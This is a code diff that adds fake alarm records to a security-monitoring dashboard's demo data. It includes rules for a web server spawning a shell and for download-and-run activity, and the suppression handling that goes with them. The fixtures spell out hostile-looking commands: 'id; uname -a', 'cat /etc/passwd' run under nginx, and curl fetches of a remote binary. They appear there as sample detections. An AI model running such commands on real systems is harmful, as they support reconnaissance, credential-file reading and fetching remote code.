@@ -349,7 +349,9 @@ export function buildDemoData(now = Date.now()) {
   const proc = (pid: number, exe: string, args: string[], uid = 33, cwd?: string) =>
     ({ pid, exe, args, uid, euid: uid, truncated: false, ...(cwd ? { cwd } : {}) });
   type Proc = ReturnType<typeof proc>;
-  type AlarmSpec = { rule: string; severity: string; message: string; count: number; minutes: number; process: Proc; ancestors: Proc[]; state?: string; assignee?: string };
+  type AlarmSpec = { rule: string; severity: string; message: string; count: number; minutes: number; process: Proc; ancestors: Proc[]; state?: string; assignee?: string;
+    /** The host's index in `agents` (default: spread by position). */
+    host?: number; suppressed?: string };
   const alarmSpecs: AlarmSpec[] = [
     { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 3, minutes: 12,
       process: proc(48211, "/usr/bin/sh", ["sh", "-c", "id; uname -a"], 33, "/var/www/html"),
@@ -376,16 +378,29 @@ export function buildDemoData(now = Date.now()) {
     { rule: "download-and-run", severity: "medium", message: "A shell downloaded a program and ran it", count: 3, minutes: 600, assignee: "sam",
       process: proc(88213, "/usr/bin/curl", ["curl", "-o", "z", "https://203.0.113.9/z"], 1000, "/home/ola"),
       ancestors: [proc(9003, "/usr/bin/bash", ["bash"], 1000, "/home/ola")] },
+    // Siblings of the first (same host, rule, program and parent; other
+    // arguments), so an alarm's page lists several commands: a usual one
+    // and one seen once.
+    { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 12, minutes: 20, host: 0,
+      process: proc(48250, "/usr/bin/sh", ["sh", "-c", "/usr/local/bin/healthcheck"], 33, "/"),
+      ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/")] },
+    { rule: "web-server-spawns-shell", severity: "high", message: "A web server started a shell", count: 1, minutes: 45, host: 0,
+      process: proc(48302, "/usr/bin/sh", ["sh", "-c", "cat /etc/passwd"], 33, "/var/www/html"),
+      ancestors: [proc(1102, "/usr/sbin/nginx", ["nginx: worker process"], 33, "/")] },
+    // Closed by a suppression, so the Suppressed filter has something to show.
+    { rule: "download-and-run", severity: "medium", message: "A shell downloaded a program and ran it", count: 7, minutes: 900, state: "false_positive", suppressed: "900",
+      process: proc(88990, "/usr/bin/curl", ["curl", "-fsSL", "-o", "/tmp/agent.sh", "https://updates.example.test/agent.sh"], 0, "/root"),
+      ancestors: [proc(9010, "/usr/bin/bash", ["bash", "/etc/cron.daily/update"], 0, "/")] },
   ];
   const alarms = alarmSpecs.map((spec, index) => {
-    const agent = agents[(index * 7) % agents.length];
+    const agent = agents[spec.host ?? (index * 7) % agents.length];
     const last = now - spec.minutes * MINUTE;
     return {
       id: String(9000 + index), agent_id: agent?.id ?? "agent-00001", hostname: agent?.hostname ?? null,
       rule_set_id: "baseline", rule_id: spec.rule, severity: spec.severity, message: spec.message,
       exe: spec.process.exe, parent_exe: spec.ancestors[0]?.exe ?? null, count: spec.count,
       first_seen: iso(last - spec.count * 3 * MINUTE), last_seen: iso(last),
-      state: spec.state ?? "open", suppressed_by: null as string | null,
+      state: spec.state ?? "open", suppressed_by: (spec.suppressed ?? null) as string | null,
       rule_set_version: 4, rule_version: 1, confidence: 80, process: spec.process, ancestors: spec.ancestors,
       received_at: iso(last + 2000),
       detection: {
